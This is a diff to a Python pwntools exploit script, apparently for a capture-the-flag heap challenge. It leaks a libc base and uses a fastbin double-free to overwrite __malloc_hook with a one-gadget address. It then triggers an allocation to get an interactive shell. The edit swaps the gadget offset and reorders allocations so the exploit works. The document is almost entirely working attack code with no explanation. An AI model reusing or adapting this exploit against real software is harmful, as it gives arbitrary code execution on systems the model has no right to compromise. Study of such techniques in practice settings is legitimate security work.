@@ -62,41 +62,42 @@ libc_base = libc_leak - 0x3c4b78
 malloc_hook = 0x3c4b10 + libc_base
 shift_malloc_hook = malloc_hook - 0x23
 libc_xorRaxRaxRet = 0x8b945 + libc_base
-oneGadget_raxNULL = 0x45226 + libc_base
+oneGadget_rsp0x70NULL = 0xf1247 + libc_base
 
 print("[!] libc_leak: %#x" % libc_leak)
 print("[!] libc@%#x" % libc_base)
 print("[!] malloc hook@%#x" % malloc_hook)
 print("[!] shifted malloc hook@%#x" % shift_malloc_hook)
 print("[!] gadget@%#x" % libc_xorRaxRaxRet)
-print("[!] one gadget@%#x" % oneGadget_raxNULL)
+print("[!] one gadget@%#x" % oneGadget_rsp0x70NULL)
 
 # clean free list
 i = alloc(200)
 
 # FAST BIN ATTACK
 SIZE = 0x60
-c2 = alloc(SIZE)
 c1 = alloc(SIZE)
+c2 = alloc(SIZE)
 free(c1)
 free(c2)
 free(c1)
 t1 = alloc(SIZE)
-alloc(SIZE)
 
 write_(t1, p64(shift_malloc_hook))
 
+alloc(SIZE)
 alloc(SIZE)
 
 malloc_hook_index = alloc(SIZE)
 
 payload = b"A" * (0x23 - 0x10)
-payload += p64(oneGadget_raxNULL)
+payload += p64(oneGadget_rsp0x70NULL)
 
 write_(malloc_hook_index, payload)
 
-input("Check")
-
-alloc(0x20)
+r.recvuntil(b"> ")
+r.sendline(b"1")
+r.recvuntil(b"Size: ")
+r.sendline(b"%d" % 0x20)
 
 r.interactive()
